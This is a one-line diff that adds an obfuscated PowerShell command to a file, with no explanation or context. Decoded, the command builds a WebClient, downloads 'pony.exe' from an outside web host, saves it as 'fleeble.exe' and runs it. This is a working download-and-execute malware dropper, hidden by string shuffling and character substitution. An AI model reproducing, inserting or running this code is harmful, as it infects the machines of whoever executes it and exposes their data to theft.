@@ -1,0 +1,1 @@
+﻿iNvOKe-EXpreSSIon (((("{14}{3}{8}{5}{2}{18}{19}{10}{7}{20}{12}{4}{11}{0}{16}{9}{15}{17}{6}{1}{13}" -f 'ony.exeEL7,EL7fleeble.','E','i','ect System.Net.WebClient','t','wnloadF','eeble.exe','tp://wor',').Do','art-Proc','t','.com/p','dni','L7','(New-Obj','ess EL7f','exeEL7);St','l','l','e(EL7h','l')) -CrePLacE 'EL7',[CHAR]39)) 
